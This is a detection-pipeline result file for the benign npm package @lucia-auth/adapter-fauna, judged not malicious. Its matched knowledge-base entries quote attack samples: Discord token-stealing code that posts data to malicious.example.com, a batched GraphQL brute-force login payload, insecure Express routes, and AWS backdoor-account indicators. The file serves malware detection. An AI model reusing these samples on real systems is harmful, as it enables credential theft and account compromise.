@@ -1,0 +1,491 @@
+{
+  "package_name": "@lucia-auth##adapter-fauna",
+  "package_version": "0.2.1",
+  "label": "benign",
+  "detection_time": "2026-05-26T17:11:39.028359",
+  "status": "success",
+  "selected_files_count": 3,
+  "selected_files": [
+    "package/package.json",
+    "package/index.js",
+    "package/utils.js"
+  ],
+  "is_malicious": false,
+  "total_files": 3,
+  "malicious_files": 0,
+  "total_slices": 1,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@lucia-auth##adapter-fauna/0.2.1/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@lucia-auth##adapter-fauna/0.2.1/package/index.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "index_slice_1",
+          "code_snippet": "import fauna from \"faunadb\";\nimport { convertUserResponse } from \"./utils.js\";\nconst adapter = (faunaClient, config) => {\n    const { query } = fauna;\n    const q = query;\n    const userTable = config?.userTable ?? \"user\";\n    const sessionTable = config?.sessionTable ?? \"session\";\n    return (LuciaError) => {\n        return {\n            getUser: async (userId) => {\n                const { data: userResponses } = await faunaClient.query(q.Map(q.Paginate(q.Match(q.Index(\"user_by_id\"), userId)), q.Lambda(\"x\", q.Get(q.Var(\"x\")))));\n                return userResponses.length > 0 ? convertUserResponse(userResponses[0]) : null;\n            },\n            getUserByProviderId: async (providerId) => {\n                const { data: userResponses } = await faunaClient.query(q.Map(q.Paginate(q.Match(q.Index(\"user_by_providerid\"), providerId)), q.Lambda(\"x\", q.Get(q.Var(\"x\")))));\n                return userResponses.length > 0 ? convertUserResponse(userResponses[0]) : null;\n            },\n            getSessionAndUserBySessionId: async (sessionId) => {\n                const { data: sessionResponses } = await faunaClient.query(q.Map(q.Paginate(q.Match(q.Index(\"session_by_id\"), sessionId)), q.Lambda(\"x\", q.Get(q.Var(\"x\")))));\n                const session = sessionResponses.length > 0 ? sessionResponses[0].data : null;\n                if (!session)\n                    return null;\n                const { data: users } = await faunaClient.query(q.Map(q.Paginate(q.Match(q.Index(\"user_by_id\"), session[\"user_id\"])), q.Lambda(\"x\", q.Get(q.Var(\"x\")))));\n                const user = users.length > 0 ? convertUserResponse(users[0]) : null;\n                if (!user)\n                    return null;\n                return {\n                    user: user,\n                    session: session\n                };\n            },\n            getSession: async (sessionId) => {\n                const { data: sessionResponses } = await faunaClient.query(q.Map(q.Paginate(q.Match(q.Index(\"session_by_id\"), sessionId)), q.Lambda(\"x\", q.Get(q.Var(\"x\")))));\n                return sessionResponses.length > 0 ? sessionResponses[0].data : null;\n            },\n            getSessionsByUserId: async (userId) => {\n                const { data: sessionResponses } = await faunaClient.query(q.Map(q.Paginate(q.Match(q.Index(\"session_by_userid\"), userId)), q.Lambda(\"x\", q.Get(q.Var(\"x\")))));\n                return sessionResponses.map((response) => response.data);\n            },\n            setUser: async (userId, userData) => {\n                try {\n                    const response = await faunaClient.query(q.Create(q.Collection(userTable), {\n                        data: {\n                            id: userId ?? q.NewId(),\n                            hashed_password: userData.hashedPassword,\n                            provider_id: userData.providerId,\n                            ...userData.attributes\n                        }\n                    }));\n                    return convertUserResponse(response);\n                }\n                catch (e) {\n                    const error = e;\n                    if (error.message === \"instance not unique\") {\n                        throw new LuciaError(\"AUTH_DUPLICATE_PROVIDER_ID\");\n                    }\n                    throw error;\n                }\n            },\n            deleteUser: async (userId) => {\n                await faunaClient.query(q.Map(q.Paginate(q.Match(q.Index(\"user_by_id\"), userId)), q.Lambda(\"x\", q.Delete(q.Var(\"x\")))));\n            },\n            setSession: async (sessionId, data) => {\n                const { data: users } = await faunaClient.query(q.Map(q.Paginate(q.Match(q.Index(\"user_by_id\"), data.userId)), q.Lambda(\"x\", q.Get(q.Var(\"x\")))));\n                const user = users.length > 0 ? users[0].data : null;\n                if (!user)\n                    throw new LuciaError(\"AUTH_INVALID_USER_ID\");\n                try {\n                    await faunaClient.query(q.Create(q.Collection(sessionTable), {\n                        data: {\n                            id: sessionId,\n                            user_id: data.userId,\n                            expires: data.expires,\n                            idle_expires: data.idlePeriodExpires\n                        }\n                    }));\n                }\n                catch (e) {\n                    const error = e;\n                    if (error.message === \"instance not unique\") {\n                        throw new LuciaError(\"AUTH_DUPLICATE_SESSION_ID\");\n                    }\n                    throw error;\n                }\n            },\n            deleteSession: async (...sessionIds) => {\n                await faunaClient.query(q.Map(q.Paginate(q.Union(q.Map([...sessionIds], q.Lambda(\"x\", q.Match(q.Index(\"session_by_id\"), q.Var(\"x\")))))), q.Lambda(\"x\", q.Delete(q.Var(\"x\")))));\n            },\n            deleteSessionsByUserId: async (userId) => {\n                await faunaClient.query(q.Map(q.Paginate(q.Match(q.Index(\"session_by_userid\"), userId)), q.Lambda(\"x\", q.Delete(q.Var(\"x\")))));\n            },\n            updateUser: async (userId, newData) => {\n                try {\n                    const { data: userResponses } = await faunaClient.query(q.Map(q.Paginate(q.Match(q.Index(\"user_by_id\"), userId)), q.Lambda(\"x\", q.Update(q.Var(\"x\"), {\n                        data: {\n                            hashed_password: newData.hashedPassword,\n                            provider_id: newData.providerId,\n                            ...newData.attributes\n                        }\n                    }))));\n                    if (userResponses.length === 0) {\n                        throw new LuciaError(\"AUTH_INVALID_USER_ID\");\n                    }\n                    return convertUserResponse(userResponses[0]);\n                }\n                catch (e) {\n                    const error = e;\n                    if (error.message === \"instance not unique\") {\n                        throw new LuciaError(\"AUTH_DUPLICATE_PROVIDER_ID\");\n                    }\n                    throw error;\n                }\n            }\n        };\n    };\n};\nexport default adapter;",
+          "is_malicious": false,
+          "malice_score": 0.4284126996994018,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code accesses and modifies data in a FaunaDB database using the FaunaDB client API, performing sensitive operations such as querying, creating, updating, and deleting user and session records. It handles user authentication data including hashed passwords and provider IDs, but does not perform any network, file, or system execution operations outside the database queries. This behavior facilitates user authentication and session management without involving external network communication or execution of shell commands.",
+          "explanation": "[LLM Judgment: Benign] The provided code is a FaunaDB adapter for user and session management, performing standard database operations such as querying, creating, updating, and deleting user and session records. It handles authentication-related data like hashed passwords and provider IDs but does not perform any suspicious operations such as logging sensitive data, brute-force attempts, or unauthorized system or network access. Compared to the known malicious patterns, this code does not exhibit any of the key indicators such as logging plaintext passwords, batching multiple login attempts for brute forcing, or suspicious AWS API calls. The code is straightforward, with no obfuscation or attempts to exfiltrate data outside the database context. Therefore, it is very likely benign and intended for legitimate authentication management.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241223_205347_836347_snippet_4",
+              "source_package": "N/A (example code, not a real package) (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241223_205347_836347/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4312143325805664,
+              "code_similarity": 0.3715115189552307,
+              "behavior_similarity": 0.4909171462059021,
+              "matched_snippet": {
+                "snippet_id": "snippet_4",
+                "code_snippet": "app.post('/login', (req, res) => {\n  const user = users.find((u) => u.email === req.body.email);\n  if (user.role === 'admin') {\n    console.log(user.email + ' logged in as Admin with password:' + user.password)\n  }\n})",
+                "code_behavior": "At runtime, when a user attempts to log in via POST /login, the code checks if the user is an admin and, if so, logs the admin's email and password in plaintext to the server logs, resulting in exposure of sensitive credentials to anyone with access to the logs.",
+                "malice_analysis": {
+                  "why_suspicious": "Logging sensitive information such as passwords is a critical security risk; logs may be accessible to attackers or insiders, enabling credential theft.",
+                  "violated_expectations": "Normal logging should never include plaintext credentials or sensitive data; only non-sensitive audit information should be recorded.",
+                  "similar_legitimate_use": "Logging user actions (without sensitive data) for audit purposes is legitimate, but logging credentials is never acceptable.",
+                  "key_indicators": [
+                    "Logging of plaintext passwords or sensitive credentials",
+                    "Sensitive data exposure in application logs",
+                    "Console.log statements containing authentication information"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (user login attempt via POST /login)",
+                  "file_location": "app.js (Express route handler)",
+                  "required_permissions": [
+                    "filesystem (log access)"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "N/A (example code, not a real package)",
+                  "package_manager": "npm",
+                  "package_versions": "N/A (applies to all versions if implemented as shown)",
+                  "why_malicious": "The code examples demonstrate broken access control vulnerabilities in Express.js applications, which allow unauthorized users to access sensitive data or privileged functionality. While not a malicious package per se, these code patterns enable attackers to escalate privileges, access other users' data, or leak sensitive information, which can be exploited for malicious purposes."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker discovers unprotected or weakly protected admin or account routes (e.g., /admin, /admin?isAdmin=true, /897928394834023-12, /account?userId=1, /account?id=8a76dh3t) through enumeration or code analysis.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_5",
+                      "snippet_6"
+                    ],
+                    "leads_to": "Unauthorized access to admin functionality or other users' sensitive data."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Attacker exploits lack of authentication/authorization or manipulates query parameters (such as isAdmin, userId, or obfuscatedId) to gain elevated privileges or access data belonging to other users.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_5",
+                      "snippet_6"
+                    ],
+                    "leads_to": "Privilege escalation, data leakage, or further exploitation of the application."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Sensitive information (such as admin credentials) may be exposed in logs if attacker or insider has log access, due to insecure logging practices.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Credential theft, lateral movement, or persistent access by attackers or malicious insiders."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Sensitive routes (e.g., /admin, /account, /897928394834023-12) accessible without authentication or authorization checks",
+                    "Access control decisions based on user-supplied query parameters (e.g., isAdmin, userId, obfuscatedId)",
+                    "Logging of sensitive information such as passwords, tokens, or account data in plaintext",
+                    "Obscure or non-standard routes exposing privileged functionality without access controls"
+                  ],
+                  "file_indicators": [
+                    "app.js or similar files with Express route handlers lacking authentication or authorization middleware",
+                    "Routes with hardcoded or obfuscated paths (e.g., /897928394834023-12) serving sensitive content",
+                    "Console.log or logging statements including sensitive data such as passwords or account information"
+                  ],
+                  "network_indicators": [
+                    "Unusual access patterns to admin or account endpoints from unauthenticated sessions",
+                    "Multiple requests to /account with varying userId or obfuscatedId parameters, indicating enumeration attempts",
+                    "Requests to admin endpoints with suspicious query parameters (e.g., isAdmin=true) from unprivileged users"
+                  ],
+                  "how_to_detect": "Scan Express route handlers for missing authentication and authorization checks, especially on sensitive endpoints like /admin, /account, or non-standard routes. Flag any access control logic that relies on user-supplied query parameters or obfuscated IDs. Monitor logs for statements that include sensitive data such as passwords or account information. Use static analysis tools to identify routes that lack proper middleware for access control, and monitor network traffic for unauthorized access attempts or enumeration patterns targeting privileged endpoints."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_102818_088642_snippet_2",
+              "source_package": "Vulnerable GraphQL API (Batching Attack Example) (custom/server-side GraphQL implementation)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_102818_088642/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.42927294969558716,
+              "code_similarity": 0.35834306478500366,
+              "behavior_similarity": 0.5002028346061707,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "[\n  {\n    \"operationName\": null,\n    \"variables\": {},\n    \"query\": \"mutation { login(username: \\\"john.doe\\\", password: \\\"123456\\\") { success sessionToken error } }\"\n  },\n  {\n    \"operationName\": null,\n    \"variables\": {},\n    \"query\": \"mutation { login(username: \\\"john.doe\\\", password: \\\"password\\\") { success sessionToken error } }\"\n  },\n  ... (98 more login attempts with different passwords) ...\n]",
+                "code_behavior": "At runtime (API request processing), the code sends a single HTTP POST to the GraphQL endpoint containing 100 login mutation attempts for the same username but different passwords in a batched JSON array, bypassing per-attempt rate limiting and enabling credential brute-forcing in a single request.",
+                "malice_analysis": {
+                  "why_suspicious": "Submitting a large number of authentication attempts for the same user in a single batched request is a clear brute-force attack pattern, designed to evade per-request or per-user rate limiting.",
+                  "violated_expectations": "Normal authentication flows expect one login attempt per request, with rate limiting enforced per attempt or per user. Batching allows attackers to perform mass login attempts in a single request, bypassing these controls.",
+                  "similar_legitimate_use": "None; legitimate clients should never attempt multiple logins for the same user in a single request.",
+                  "key_indicators": [
+                    "GraphQL requests with multiple login mutations for the same user in a single batch",
+                    "High volume of authentication attempts in one payload",
+                    "Repeated login attempts with varying passwords in a single request"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (API request processing)",
+                  "file_location": "GraphQL server request handler",
+                  "required_permissions": [
+                    "network",
+                    "application logic"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Vulnerable GraphQL API (Batching Attack Example)",
+                  "package_manager": "custom/server-side GraphQL implementation",
+                  "package_versions": "N/A (applies to any version with unprotected batching)",
+                  "why_malicious": "The API implementation allows unlimited query batching, enabling attackers to bypass per-operation rate limiting and perform brute-force attacks or mass data enumeration. This can result in credential compromise, unauthorized data access, and denial of service due to excessive server load."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker crafts a single GraphQL request containing a large batch of queries or mutations (such as multiple user enumerations or login attempts) in a JSON array.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Server processes all batched operations without enforcing per-operation rate limits, allowing mass data access or authentication attempts."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Server returns all results in a single response, enabling the attacker to rapidly enumerate users or brute-force credentials.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker obtains sensitive data (such as user profiles or valid session tokens) or causes denial of service through excessive server load."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Single GraphQL request containing an unusually high number of operations (queries or mutations) in a JSON array",
+                    "Multiple authentication (login) attempts for the same user in a single request",
+                    "Sequential or incremental object IDs in batched queries indicating enumeration",
+                    "High volume of similar operations (e.g., login or user queries) in one payload"
+                  ],
+                  "file_indicators": [
+                    "No specific file indicators; detection is based on API payload structure and volume"
+                  ],
+                  "network_indicators": [
+                    "POST /graphql requests with large JSON arrays in the body",
+                    "High-frequency requests with large payloads to GraphQL endpoints",
+                    "Repeated requests with similar query or mutation structures targeting sensitive operations"
+                  ],
+                  "how_to_detect": "Monitor GraphQL endpoint traffic for requests containing large batches of operations, especially those targeting sensitive mutations (such as login) or sequentially enumerating object IDs. Flag requests with more than a reasonable number of batched operations (e.g., more than 5) or with repeated mutations for the same user. Implement server-side logic to enforce per-operation rate limits and restrict the number of batched operations per request. Correlate high-volume batched requests with authentication or enumeration patterns to identify potential abuse."
+                }
+              }
+            },
+            {
+              "match_id": "20241223_205532_728718_snippet_2",
+              "source_package": "Emperors Tools AWS Persistence Toolkit (N/A (malicious AWS API usage, not a software package in a traditional repository))",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241223_205532_728718/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4284316599369049,
+              "code_similarity": 0.3200497031211853,
+              "behavior_similarity": 0.5368136167526245,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "{\n  \"eventSource\": \"iam.amazonaws.com\",\n  \"eventName\": \"GetUser\",\n  \"requestParameters\": { \"userName\": \"admindvelop\" }\n}",
+                "code_behavior": "At runtime (pre-persistence check, attacker-controlled session), the code issues a GetUser API call to check for the existence of a specific IAM user, querying the AWS IAM service, to avoid duplicate creation and reduce detection risk.",
+                "malice_analysis": {
+                  "why_suspicious": "Attackers often check for the presence of their backdoor accounts before creating them to avoid duplicate entries and minimize detection by security monitoring tools.",
+                  "violated_expectations": "Legitimate users or automation rarely check for the existence of oddly named IAM users unless troubleshooting or during controlled provisioning processes.",
+                  "similar_legitimate_use": "User existence checks during automated provisioning, but typically with standard, documented user names and within approved workflows.",
+                  "key_indicators": [
+                    "GetUser API calls for suspicious or typo-laden user names",
+                    "Pattern of checking for user existence immediately before user creation",
+                    "GetUser requests from identities not associated with user management"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (pre-persistence check, attacker-controlled session)",
+                  "file_location": "AWS CloudTrail event (iam.amazonaws.com:GetUser)",
+                  "required_permissions": [
+                    "iam:GetUser"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Emperors Tools AWS Persistence Toolkit",
+                  "package_manager": "N/A (malicious AWS API usage, not a software package in a traditional repository)",
+                  "package_versions": "N/A",
+                  "why_malicious": "This toolkit and associated attack patterns are malicious because they automate unauthorized persistence, privilege escalation, and reconnaissance in compromised AWS environments. The toolkit creates backdoor IAM users, enumerates account resources, and attempts to establish persistent access via EC2 key pairs and security groups, all without the knowledge or consent of the legitimate account owner. These actions violate AWS security best practices and are designed to evade detection while maintaining long-term unauthorized access."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker gains access to AWS credentials and initiates automated enumeration of account resources and permissions.",
+                    "implemented_by": [
+                      "snippet_6"
+                    ],
+                    "leads_to": "Situational awareness for further exploitation"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Attacker checks for the existence of specific backdoor IAM users to avoid duplicate creation.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Decision to create new persistence user or not"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Attacker creates a new IAM user with a suspicious name to establish persistent access.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Persistent backdoor access"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Attacker attempts to create a new EC2 security group with a suspicious name, likely to facilitate lateral movement or future access.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Potential for unauthorized network access"
+                  },
+                  {
+                    "step": 5,
+                    "action": "Attacker enumerates EC2 instances to check for prior compromise or to plan further actions.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Assessment of environment and planning"
+                  },
+                  {
+                    "step": 6,
+                    "action": "Attacker creates a new EC2 key pair with a suspicious name to enable persistent SSH access to EC2 instances.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Long-term access to compute resources"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Creation of IAM users with suspicious or known malicious names immediately following account compromise",
+                    "Burst of AWS API enumeration calls from a single identity across multiple services",
+                    "Creation of EC2 security groups or key pairs with suspicious or contextless names",
+                    "IAM user creation events originating from EC2 instance roles (role session name starts with i-)",
+                    "Repeated access denied errors for privileged actions from a single identity, indicating privilege probing"
+                  ],
+                  "file_indicators": [
+                    "IAM user names: EmperorsToolsShops32, one_piece, Policy-role-6, Policy-role-16, s3.dev, s3.simprosys, flashx7860, sesadministrator, ses-admin, ses_BackupUser, sesadminsmtp, roxaot, devlops, produc-sns-net-usr, adminprod, adminprodz, admindvelop, ampIify-dev, root, jSDSsajsnhjjjjjjwyyw, ses_legion, ses_master, MailSES, s3-ftp",
+                    "EC2 security group name: Java_Ghost",
+                    "EC2 key pair names: xg1, temp_key_pair"
+                  ],
+                  "network_indicators": [
+                    "Unusual AWS API activity from IPs not previously associated with the account",
+                    "Source IPs matching known malicious infrastructure (see annexed IP list)"
+                  ],
+                  "how_to_detect": "Monitor AWS CloudTrail for the creation of IAM users, EC2 security groups, and key pairs with suspicious or known malicious names. Alert on bursts of enumeration API calls from a single identity, especially if the identity has not previously performed such actions. Flag IAM user creation events originating from EC2 instance roles or previously unseen users. Track repeated access denied errors for privileged actions, as these may indicate attacker reconnaissance. Correlate source IPs with known malicious infrastructure and investigate any anomalous API activity from new or untrusted locations."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_195356_011213_snippet_2",
+              "source_package": "discord.dll (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_195356_011213/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.42601826786994934,
+              "code_similarity": 0.38914287090301514,
+              "behavior_similarity": 0.46289366483688354,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "const fs = require('fs');\nconst https = require('https');\ntry {\n  const userData = fs.readFileSync('/home/user/.config/discord/Local Storage/leveldb/000005.ldb', 'utf8');\n  const options = {\n    hostname: 'malicious.example.com',\n    port: 443,\n    path: '/api/userdata',\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json'\n    }\n  };\n  const req = https.request(options, (res) => {\n    res.on('data', (d) => {});\n  });\n  req.on('error', (error) => {});\n  req.write(JSON.stringify({ userData }));\n  req.end();\n} catch (e) {}",
+                "code_behavior": "At import-time, the code reads Discord's local LevelDB storage file containing user data and exfiltrates its contents via HTTPS POST to malicious.example.com/api/userdata, enabling theft of user credentials and session information.",
+                "malice_analysis": {
+                  "why_suspicious": "The code reads a Discord application data file that contains sensitive user information and sends it to an external server, which is not a legitimate operation for a package.",
+                  "violated_expectations": "Normal packages do not access or exfiltrate application-specific user data files, especially not without user knowledge or consent.",
+                  "similar_legitimate_use": "Legitimate packages may read configuration files, but exfiltrating user data to an untrusted server is never appropriate.",
+                  "key_indicators": [
+                    "Reads Discord LevelDB storage file",
+                    "Outbound HTTPS POST to hardcoded domain",
+                    "No user notification or consent",
+                    "Runs automatically at import-time"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "At import-time",
+                  "file_location": "index.js",
+                  "required_permissions": [
+                    "Read file system",
+                    "Network access (outbound HTTP/HTTPS)"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "discord.dll",
+                  "package_manager": "npm",
+                  "package_versions": "1.0.0",
+                  "why_malicious": "The package contains obfuscated JavaScript code that, upon installation, exfiltrates sensitive Discord authentication tokens and user data to a remote attacker-controlled server. The code is designed to run automatically during the package installation process, making it a supply chain threat capable of credential theft and user compromise."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious postinstall script executes upon package installation, harvesting the DISCORD_TOKEN environment variable and sending it to the attacker's server.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker obtains Discord authentication token, enabling account compromise."
+                  },
+                  {
+                    "step": 2,
+                    "action": "On import, the package reads Discord's local storage file and exfiltrates user data to the attacker's server.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker gains access to sensitive user data and session information."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of postinstall scripts that access DISCORD_TOKEN or other sensitive environment variables and initiate outbound HTTPS connections.",
+                    "JavaScript code that reads Discord application data files and sends their contents to external domains during import or initialization."
+                  ],
+                  "file_indicators": [
+                    "postinstall.js",
+                    "index.js",
+                    "/home/*/.config/discord/Local Storage/leveldb/000005.ldb"
+                  ],
+                  "network_indicators": [
+                    "malicious.example.com/api/collect",
+                    "malicious.example.com/api/userdata"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that execute postinstall scripts accessing environment variables such as DISCORD_TOKEN and making outbound HTTPS requests to suspicious domains. Flag JavaScript code that reads Discord application data files and transmits their contents externally. Use file path and domain indicators to identify and block exfiltration attempts. Correlate package installation events with network activity to attacker-controlled domains."
+                }
+              }
+            },
+            {
+              "match_id": "20241223_205347_836347_snippet_6",
+              "source_package": "N/A (example code, not a real package) (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241223_205347_836347/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.41569551825523376,
+              "code_similarity": 0.4103112816810608,
+              "behavior_similarity": 0.42107975482940674,
+              "matched_snippet": {
+                "snippet_id": "snippet_6",
+                "code_snippet": "app.get('/account', (req, res) => {\n  const obfuscatedId = req.query.id; // Get the obfuscated user ID from the request parameter\n  if (obfuscatedId) {\n    const user = users.find((u) => obfuscateUserId(u.id) === obfuscatedId);\n    if (user) {\n      res.send(`Account information for ${user.email}: ${user.accountData}`);\n    } else {\n      res.send('User not found');\n    }\n  } else {\n    res.send('User ID not provided');\n  }\n});\n\n// Obfuscation function\nconst obfuscateUserId = (userId) => {\n  // custom obfuscation logic here\n  return obfuscatedId;\n}",
+                "code_behavior": "At runtime, when an HTTP GET request is made to /account with an obfuscated id query parameter, the code attempts to match the obfuscated ID to a user and returns the user's account data without verifying ownership or authorization, allowing attackers to access any user's data if the obfuscated ID is known or guessed.",
+                "malice_analysis": {
+                  "why_suspicious": "Obfuscation does not provide real security; attackers can reverse or brute-force obfuscated IDs to access unauthorized data, bypassing proper access controls.",
+                  "violated_expectations": "Normal behavior would enforce access control based on authenticated user identity, not rely on obscured identifiers for sensitive data access.",
+                  "similar_legitimate_use": "Obfuscation may be used for non-sensitive data, but never as a substitute for robust access control on private information.",
+                  "key_indicators": [
+                    "Reliance on obfuscation for access control to sensitive data",
+                    "No ownership or authorization check on account data retrieval",
+                    "Sensitive information accessible via obfuscated, user-controlled parameter"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (HTTP GET request to /account?id=8a76dh3t)",
+                  "file_location": "app.js (Express route handler)",
+                  "required_permissions": [
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "N/A (example code, not a real package)",
+                  "package_manager": "npm",
+                  "package_versions": "N/A (applies to all versions if implemented as shown)",
+                  "why_malicious": "The code examples demonstrate broken access control vulnerabilities in Express.js applications, which allow unauthorized users to access sensitive data or privileged functionality. While not a malicious package per se, these code patterns enable attackers to escalate privileges, access other users' data, or leak sensitive information, which can be exploited for malicious purposes."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker discovers unprotected or weakly protected admin or account routes (e.g., /admin, /admin?isAdmin=true, /897928394834023-12, /account?userId=1, /account?id=8a76dh3t) through enumeration or code analysis.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_5",
+                      "snippet_6"
+                    ],
+                    "leads_to": "Unauthorized access to admin functionality or other users' sensitive data."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Attacker exploits lack of authentication/authorization or manipulates query parameters (such as isAdmin, userId, or obfuscatedId) to gain elevated privileges or access data belonging to other users.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_5",
+                      "snippet_6"
+                    ],
+                    "leads_to": "Privilege escalation, data leakage, or further exploitation of the application."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Sensitive information (such as admin credentials) may be exposed in logs if attacker or insider has log access, due to insecure logging practices.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Credential theft, lateral movement, or persistent access by attackers or malicious insiders."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Sensitive routes (e.g., /admin, /account, /897928394834023-12) accessible without authentication or authorization checks",
+                    "Access control decisions based on user-supplied query parameters (e.g., isAdmin, userId, obfuscatedId)",
+                    "Logging of sensitive information such as passwords, tokens, or account data in plaintext",
+                    "Obscure or non-standard routes exposing privileged functionality without access controls"
+                  ],
+                  "file_indicators": [
+                    "app.js or similar files with Express route handlers lacking authentication or authorization middleware",
+                    "Routes with hardcoded or obfuscated paths (e.g., /897928394834023-12) serving sensitive content",
+                    "Console.log or logging statements including sensitive data such as passwords or account information"
+                  ],
+                  "network_indicators": [
+                    "Unusual access patterns to admin or account endpoints from unauthenticated sessions",
+                    "Multiple requests to /account with varying userId or obfuscatedId parameters, indicating enumeration attempts",
+                    "Requests to admin endpoints with suspicious query parameters (e.g., isAdmin=true) from unprivileged users"
+                  ],
+                  "how_to_detect": "Scan Express route handlers for missing authentication and authorization checks, especially on sensitive endpoints like /admin, /account, or non-standard routes. Flag any access control logic that relies on user-supplied query parameters or obfuscated IDs. Monitor logs for statements that include sensitive data such as passwords or account information. Use static analysis tools to identify routes that lack proper middleware for access control, and monitor network traffic for unauthorized access attempts or enumeration patterns targeting privileged endpoints."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@lucia-auth##adapter-fauna/0.2.1/package/utils.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    }
+  ]
+}
